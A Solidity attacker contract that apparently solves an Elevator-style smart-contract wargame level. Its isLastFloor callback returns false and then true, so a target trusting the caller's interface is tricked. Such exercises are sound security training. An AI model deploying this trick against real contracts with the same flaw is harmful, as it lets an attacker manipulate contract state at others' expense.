// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface targetInterface {
    function goTo(uint _floor) external;
}

contract ElevatorAttacker {
    targetInterface target;
    uint8 counter;

    constructor(address targetAdress) {
        target = targetInterface(targetAdress);
    }

    function attack() public {
        target.goTo(0);
    }

    function isLastFloor(uint) public returns (bool) {
        if (counter == 0) {
            counter++;
            return false;
        } else {
            return true;
        }
    }
}
